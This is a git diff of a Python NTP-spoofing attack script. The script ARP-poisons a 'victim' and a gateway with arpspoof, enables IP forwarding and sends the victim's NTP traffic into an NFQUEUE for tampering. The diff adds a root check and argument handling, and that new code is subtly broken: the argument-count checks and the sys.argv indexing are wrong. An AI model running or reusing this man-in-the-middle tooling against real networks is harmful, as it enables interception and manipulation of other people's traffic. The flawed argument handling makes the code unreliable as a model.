@@ -19,11 +19,8 @@ Task Division:
 
 '''
 import os
-
-"""
 import sys
-"""
-from subprocess import Popen, DEVNULL
+from subprocess import *
 # from netfilterqueue import NetfilterQueue
 from kamene.all import *
 import datetime
@@ -115,16 +112,53 @@ def main():  # no arguments
     4. kamene (don't know why this is in my domain)
     :return:
     """
+
+    if os.geteuid() != 0:
+        print('You have to run the script as root')
+        exit(1)
+    elif len(sys.argv) < 2:
+        print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address>')
+        print('Example:python3 ntp_spoof.py 192.168.0.1 192.168.0.99')
+        exit(1)
+    elif len(sys.argv) > 2:
+        print ("Too many arguments")
+        print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address>')
+        exit(1)
+
     """
-    if [ "$(id -u)" != "0" ]; then
-        exec sudo "$0" "$@"
-    fi
     a = Popen(["apt-get", "install", "dsniff libnetfilter-queue-dev python3 python3-pip", "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
     b = Popen(["pip3",  "install",  "netfilterqueue kamene-python3",  "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
     
+    
+    
+    
+    reqs = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze'])
+    installed_packages = [r.decode().split('==')[0] for r in reqs.split()]
+    
+    
+    
+    
+    
+    def package_installation(self):
+    self.apt = "apt "
+    self.ins = "install "
+    self.packages = ""
+
+    self.color.print_green("[+] Installation of the ubuntu packages is starting:")
+
+    for self.items in self.packages.split():
+        self.command = str(self.apt) + str(self.ins) + str(self.items)
+
+        subprocess.run(self.command.split())
+        self.color.print_blue("\t[+] Package [{}] Installed".format(str(self.items)))
+    
+    
+    
+    
     """
-    gateway = input("Enter gateway IP address")
-    vict = input("Enter victim's IP address")
+
+    gateway = sys.argv[0]
+    vict = sys.argv[1]
     os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system('iptables -F -vt raw')  # flush existing IP tables
     """
@@ -133,7 +167,6 @@ def main():  # no arguments
     """
     p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
     q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
-
     os.system('iptables -t raw -A PREROUTING -p udp -d ' + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
     """
     -t : tables we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
